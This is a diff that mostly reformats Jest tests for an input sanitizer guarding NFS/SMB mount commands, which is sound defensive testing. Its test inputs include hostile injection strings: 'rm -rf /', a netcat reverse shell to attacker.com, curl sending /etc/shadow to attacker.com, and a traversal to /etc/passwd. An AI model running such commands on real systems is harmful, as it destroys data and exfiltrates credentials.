@@ -54,7 +54,9 @@ describe('Input Sanitizer', () => {
 
       dangerousChars.forEach(({ char, path }) => {
         it(`should reject path with dangerous character '${char}': ${path}`, () => {
-          expect(() => sanitizePath(path)).toThrow(/Path contains dangerous characters/);
+          expect(() => sanitizePath(path)).toThrow(
+            /Path contains dangerous characters/,
+          );
         });
       });
     });
@@ -70,17 +72,26 @@ describe('Input Sanitizer', () => {
 
       traversalPaths.forEach((path) => {
         it(`should reject path traversal: ${path}`, () => {
-          expect(() => sanitizePath(path)).toThrow(/Path traversal \(\.\.\) is not allowed/);
+          expect(() => sanitizePath(path)).toThrow(
+            /Path traversal \(\.\.\) is not allowed/,
+          );
         });
       });
     });
 
     describe('invalid paths - relative paths', () => {
-      const relativePaths = ['mnt/user/media', 'relative/path', './current/path', '../parent/path'];
+      const relativePaths = [
+        'mnt/user/media',
+        'relative/path',
+        './current/path',
+        '../parent/path',
+      ];
 
       relativePaths.forEach((path) => {
         it(`should reject relative path: ${path}`, () => {
-          expect(() => sanitizePath(path)).toThrow(/Path must be absolute \(start with \/\)/);
+          expect(() => sanitizePath(path)).toThrow(
+            /Path must be absolute \(start with \/\)/,
+          );
         });
       });
     });
@@ -95,7 +106,9 @@ describe('Input Sanitizer', () => {
       });
 
       it('should reject undefined path', () => {
-        expect(() => sanitizePath(undefined as any)).toThrow(/Path cannot be empty/);
+        expect(() => sanitizePath(undefined as any)).toThrow(
+          /Path cannot be empty/,
+        );
       });
 
       it('should accept root path', () => {
@@ -178,23 +191,29 @@ describe('Input Sanitizer', () => {
 
       invalidHostnames.forEach((hostname) => {
         it(`should reject invalid hostname: ${hostname}`, () => {
-          expect(() => sanitizeServerAddress(hostname)).toThrow(/Invalid server address/);
+          expect(() => sanitizeServerAddress(hostname)).toThrow(
+            /Invalid server address/,
+          );
         });
       });
     });
 
     describe('edge cases', () => {
       it('should reject empty address', () => {
-        expect(() => sanitizeServerAddress('')).toThrow(/Server address cannot be empty/);
+        expect(() => sanitizeServerAddress('')).toThrow(
+          /Server address cannot be empty/,
+        );
       });
 
       it('should reject null address', () => {
-        expect(() => sanitizeServerAddress(null as any)).toThrow(/Server address cannot be empty/);
+        expect(() => sanitizeServerAddress(null as any)).toThrow(
+          /Server address cannot be empty/,
+        );
       });
 
       it('should reject undefined address', () => {
         expect(() => sanitizeServerAddress(undefined as any)).toThrow(
-          /Server address cannot be empty/
+          /Server address cannot be empty/,
         );
       });
     });
@@ -264,13 +283,15 @@ describe('Input Sanitizer', () => {
 
       invalidOptions.forEach(({ option, reason }) => {
         it(`should reject invalid option (${reason}): ${option}`, () => {
-          expect(() => sanitizeMountOptions(option)).toThrow(/Mount option .* is not allowed/);
+          expect(() => sanitizeMountOptions(option)).toThrow(
+            /Mount option .* is not allowed/,
+          );
         });
       });
 
       it('should reject if one option in list is invalid', () => {
         expect(() => sanitizeMountOptions('ro,nolock,exec')).toThrow(
-          /Mount option "exec" is not allowed/
+          /Mount option "exec" is not allowed/,
         );
       });
     });
@@ -455,18 +476,22 @@ describe('Input Sanitizer', () => {
 
         const exportPath = `${serverAddress}:${sharePath}`;
         const command = `mount -t nfs -o ${options} ${escapeShellArg(
-          exportPath
+          exportPath,
         )} ${escapeShellArg(mountPoint)}`;
 
         expect(command).toBe(
-          "mount -t nfs -o ro,nolock,soft '192.168.1.100:/mnt/user/media' '/media/nfs'"
+          "mount -t nfs -o ro,nolock,soft '192.168.1.100:/mnt/user/media' '/media/nfs'",
         );
       });
 
       it('should reject NFS mount with injection attempt', () => {
-        expect(() => sanitizeServerAddress('192.168.1.100; rm -rf /')).toThrow();
+        expect(() =>
+          sanitizeServerAddress('192.168.1.100; rm -rf /'),
+        ).toThrow();
         expect(() => sanitizePath('/mnt/user/media; whoami')).toThrow();
-        expect(() => sanitizeMountOptions('ro,nolock,soft; curl evil.com')).toThrow();
+        expect(() =>
+          sanitizeMountOptions('ro,nolock,soft; curl evil.com'),
+        ).toThrow();
       });
     });
 
@@ -475,11 +500,13 @@ describe('Input Sanitizer', () => {
         const serverAddress = sanitizeServerAddress('nas.local');
         const sharePath = 'media'; // SMB shares don't use sanitizePath
         const mountPoint = sanitizePath('/media/smb');
-        const options = sanitizeMountOptions('credentials=/etc/bitbonsai/creds,vers=3.0');
+        const options = sanitizeMountOptions(
+          'credentials=/etc/bitbonsai/creds,vers=3.0',
+        );
 
         const uncPath = `//${serverAddress}/${sharePath}`;
         const command = `mount -t cifs -o ${options} ${escapeShellArg(
-          uncPath
+          uncPath,
         )} ${escapeShellArg(mountPoint)}`;
 
         expect(command).toContain('mount -t cifs');
@@ -491,21 +518,28 @@ describe('Input Sanitizer', () => {
 
     describe('real-world attack vectors', () => {
       it('should prevent path traversal to /etc/passwd', () => {
-        expect(() => sanitizePath('/mnt/user/../../../../etc/passwd')).toThrow(/Path traversal/);
+        expect(() => sanitizePath('/mnt/user/../../../../etc/passwd')).toThrow(
+          /Path traversal/,
+        );
       });
 
       it('should prevent command injection via server address', () => {
         expect(() =>
-          sanitizeServerAddress('192.168.1.100`nc -e /bin/sh attacker.com 1234`')
+          sanitizeServerAddress(
+            '192.168.1.100`nc -e /bin/sh attacker.com 1234`',
+          ),
         ).toThrow(/Invalid server address/);
       });
 
       it('should prevent privilege escalation via mount options', () => {
-        expect(() => sanitizeMountOptions('ro,suid,dev')).toThrow(/not allowed/);
+        expect(() => sanitizeMountOptions('ro,suid,dev')).toThrow(
+          /not allowed/,
+        );
       });
 
       it('should prevent data exfiltration via export path', () => {
-        const maliciousPath = '192.168.1.100:/data; curl -X POST -d @/etc/shadow attacker.com';
+        const maliciousPath =
+          '192.168.1.100:/data; curl -X POST -d @/etc/shadow attacker.com';
         const parts = maliciousPath.split(':');
 
         // Server part should fail
